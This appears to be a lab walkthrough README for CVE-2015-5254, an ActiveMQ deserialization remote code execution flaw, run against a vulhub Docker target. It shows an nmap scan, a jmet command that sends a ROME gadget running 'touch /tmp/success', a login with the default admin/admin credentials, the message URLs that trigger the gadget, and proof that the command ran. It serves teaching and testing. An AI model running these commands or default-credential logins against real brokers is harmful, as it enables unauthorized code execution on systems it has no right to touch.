# CVE-2015-5254 ActiveMQ  Deserialization RCE

[![asciicast](https://asciinema.org/a/pkjnKBTgESrwJ1MZk5CDkVOB9.svg)](https://asciinema.org/a/pkjnKBTgESrwJ1MZk5CDkVOB9)

## 0x01 sure port 61616 is open
### nmap  -p 61616 -Pn -T5 -n -sC -sV 10.10.20.166
```
root@kali:~# nmap  -p 61616 -Pn -T5 -n -sC -sV 10.10.20.166
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-30 02:05 EDT
Nmap scan report for 10.10.20.166
Host is up (0.00022s latency).

PORT      STATE SERVICE  VERSION
61616/tcp open  apachemq ActiveMQ OpenWire transport
| fingerprint-strings:
|   NULL:
|     ActiveMQ
|     MaxFrameSize
|     CacheSize
|     CacheEnabled
|     SizePrefixDisabled
|     MaxInactivityDurationInitalDelay
|     TcpNoDelayEnabled
|     MaxInactivityDuration
|     TightEncodingEnabled
|_    StackTraceEnabled
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port61616-TCP:V=7.70%I=7%D=8/30%Time=5D68BCBA%P=x86_64-pc-linux-gnu%r(N
SF:ULL,F4,"\0\0\0\xf0\x01ActiveMQ\0\0\0\n\x01\0\0\0\xde\0\0\0\t\0\x0cMaxFr
SF:ameSize\x06\0\0\0\0\x06@\0\0\0\tCacheSize\x05\0\0\x04\0\0\x0cCacheEnabl
SF:ed\x01\x01\0\x12SizePrefixDisabled\x01\0\0\x20MaxInactivityDurationInit
SF:alDelay\x06\0\0\0\0\0\0'\x10\0\x11TcpNoDelayEnabled\x01\x01\0\x15MaxIna
SF:ctivityDuration\x06\0\0\0\0\0\0u0\0\x14TightEncodingEnabled\x01\x01\0\x
SF:11StackTraceEnabled\x01\x01");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.52 seconds
root@kali:~#

```

## 0x02 send serialization data



`java.nio.file.NoSuchFileException: external`

`root@kali:~/jar#   mkdir external`

`root@kali:~/jar#   java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME 10.10.20.166 61616`

![](./payload.jpg)

```
root@kali:~/jar# java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME 10.10.20.166 61616
ERROR d.c.j.JMET [main] Failed to setup external libraries!
java.nio.file.NoSuchFileException: external
        at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86) ~[?:1.8.0_60]
        at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102) ~[?:1.8.0_60]
        at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107) ~[?:1.8.0_60]
        at sun.nio.fs.UnixFileSystemProvider.newDirectoryStream(UnixFileSystemProvider.java:427) ~[?:1.8.0_60]
        at java.nio.file.Files.newDirectoryStream(Files.java:525) ~[?:1.8.0_60]
        at de.codewhite.jmet.JMET.setupExternalLibs(JMET.java:174) [jmet-0.1.0-all.jar:?]
        at de.codewhite.jmet.JMET.setup(JMET.java:118) [jmet-0.1.0-all.jar:?]
        at de.codewhite.jmet.JMET.main(JMET.java:58) [jmet-0.1.0-all.jar:?]
INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:kali-39017-1567145443876-0:1
INFO d.c.j.t.JMSTarget [main] Sent gadget "ROME" with command: "touch /tmp/success"
INFO d.c.j.t.JMSTarget [main] Shutting down connection ID:kali-39017-1567145443876-0:1
root@kali:~/jar# mkdir external
root@kali:~/jar# java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME 10.10.20.166 61616
INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:kali-36275-1567145554620-0:1
INFO d.c.j.t.JMSTarget [main] Sent gadget "ROME" with command: "touch /tmp/success"
INFO d.c.j.t.JMSTarget [main] Shutting down connection ID:kali-36275-1567145554620-0:1
root@kali:~/jar#

```

## 0x03 login admin,then click message ID Execute command
`default password: admin/admin`

`http://10.10.20.166:8161/admin/browse.jsp?JMSDestination=event`

![](./event.jpg)

### Then F5

![](./event2.jpg)

`http://10.10.20.166:8161/admin/message.jsp?id=ID%3akali-36275-1567145554620-1%3a1%3a1%3a1%3a1&JMSDestination=event`

![](./message.jpg)

### touch /tmp/success

```
root@kali:~/jar# docker ps -a
CONTAINER ID        IMAGE                    COMMAND                  CREATED             STATUS              PORTS                                              NAMES
6dc7032bab70        vulhub/activemq:5.11.1   "/bin/sh -c 'bin/act…"   32 minutes ago      Up 32 minutes       0.0.0.0:8161->8161/tcp, 0.0.0.0:61616->61616/tcp   cve-2015-5254_activemq_1
26e4f8225dcd        vulhub/jboss:as-6.1.0    "/run.sh"                3 days ago          Up 3 days           0.0.0.0:8080->8080/tcp, 0.0.0.0:9990->9990/tcp     jmxinvokerservlet-deserialization_jboss_1
8a45bc8d8915        mongo                    "docker-entrypoint.s…"   3 days ago          Up 3 days           0.0.0.0:27017->27017/tcp                           docker_mongodb
root@kali:~/jar# docker exec -it 6dc7032bab70 /bin/bash
root@6dc7032bab70:/opt/apache-activemq-5.11.1# cd /tmp
root@6dc7032bab70:/tmp# ls
hsperfdata_root  success
root@6dc7032bab70:/tmp#

```

## No serialization Success

 Message Details 
 
 ```
 Cannot display ObjectMessage body. 
 Reason: Failed to build body from content. 
 Serializable class not available to broker.
 Reason: java.lang.ClassNotFoundException: Forbidden class com.sun.syndication.feed.impl.ObjectBean! 
 This class is not trusted to be serialized as ObjectMessage payload. Please take a look at http://activemq.apache.org/objectmessage.html for more information on how to configure trusted classes.
 ```
 
 ```
 无法显示ObjectMessage正文。 
 原因：无法从内容构建正文。 
 可序列化的类不可用于代理。 
 原因：java.lang.ClassNotFoundException：Forbidden class com.sun.syndication.feed.impl.ObjectBean！ 
 不信任此类被序列化为ObjectMessage有效内容。
 ```
 ![](./no_success.jpg)

## 参考链接：
https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2015-5254/README.zh-cn.md

https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
